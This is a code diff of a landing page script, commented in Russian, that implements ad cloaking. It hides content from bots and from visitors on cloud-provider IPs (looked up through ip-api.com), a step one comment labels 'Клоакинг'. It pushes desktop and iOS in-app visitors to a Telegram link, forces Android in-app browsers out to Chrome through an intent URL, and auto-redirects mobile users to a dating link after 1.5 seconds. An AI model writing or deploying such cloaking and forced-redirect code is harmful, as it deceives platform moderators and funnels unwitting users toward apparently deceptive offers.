@@ -130,7 +130,7 @@ const isBotUA = /bot|crawl|spider|preview|Bytespider|TikTokBot|facebookexternalh
 const isInApp = /FBAN|FBAV|Instagram|Messenger|TikTok|Twitter|GSA|Line/i.test(ua);
 
 window.onload = async () => {
-    // 1. Фильтр по Юзер-Агенту
+    // 1. Фильтр по Юзер-Агенту известных ботов
     if (isBotUA) return;
 
     // 2. Фильтр по хостингам/IP через ip-api.com
@@ -141,22 +141,34 @@ window.onload = async () => {
             if (data.status === 'success') {
                 const provider = (data.as || '') + ' ' + (data.org || '');
                 if (/Amazon|Google|Digital|Hetzner|OVH|Microsoft|Facebook|Leaseweb|Linode|Choopa|Zscaler/i.test(provider)) {
-                    return; // Бот упирается в пустой экран
+                    return; // Клоакинг: Бот остается на пустом экране
                 }
             }
         }
     } catch (e) {}
 
-    // 3. ПРОВЕРКА НА НАХОЖДЕНИЕ ВНУТРИ ПРИЛОЖЕНИЯ (WebView)
+    // Определяем операционную систему
+    const isAndroid = /Android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+    const tgUrl = document.getElementById('tgLink').getAttribute('href');
+
+    // 3. СЕГМЕНТАЦИЯ ДЕСКТОПА: Если это НЕ Android и НЕ iOS — мгновенно уводим в Telegram
+    if (!isAndroid && !isIOS) {
+        if (tgUrl) {
+            window.location.href = tgUrl;
+        }
+        return;
+    }
+
+    // 4. ПРОВЕРКА НА НАХОЖДЕНИЕ ВНУТРИ ПРИЛОЖЕНИЯ (WebView) для мобильных
     if (isInApp) {
-        if (/Android/i.test(ua)) {
-            // Android: выбиваем в Chrome. Экран пока пустой.
+        if (isAndroid) {
+            // Android внутри приложения (FB, TikTok, Insta) -> выбиваем во внешний Chrome
             const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
             window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
             return;
-        } else {
-            // iOS (iPhone): увод во внешку невозможен, поэтому МГНОВЕННО редиректим на твой Телеграм!
-            const tgUrl = document.getElementById('tgLink').getAttribute('href');
+        } else if (isIOS) {
+            // iOS внутри приложения -> мгновенно перенаправляем в Telegram
             if (tgUrl) {
                 window.location.href = tgUrl;
             }
@@ -164,7 +176,7 @@ window.onload = async () => {
         }
     }
 
-    // 4. ЕСЛИ МЫ ВО ВНЕШНЕМ БРАУЗЕРЕ (Юзер успешно перешел на Android или зашел просто по ссылке)
+    // 5. ЕСЛИ МЫ ВО ВНЕШНЕМ МОБИЛЬНОМ БРАУЗЕРЕ (Чистый Safari или Chrome на смартфоне)
     document.body.classList.add('loaded');
     document.getElementById('mainContainer').style.display = 'block';
 
@@ -174,7 +186,7 @@ window.onload = async () => {
     document.getElementById('waText').innerText = texts[lang].wa;
     document.getElementById('note').innerText = texts[lang].note;
 
-    // Авторедирект во внешнем браузере на дейтинг через 1.5 сек
+    // Авторедирект на дейтинг через 1.5 сек
     setTimeout(() => {
         const autoUrl = document.getElementById('meetLink').getAttribute('href');
         if (autoUrl) {
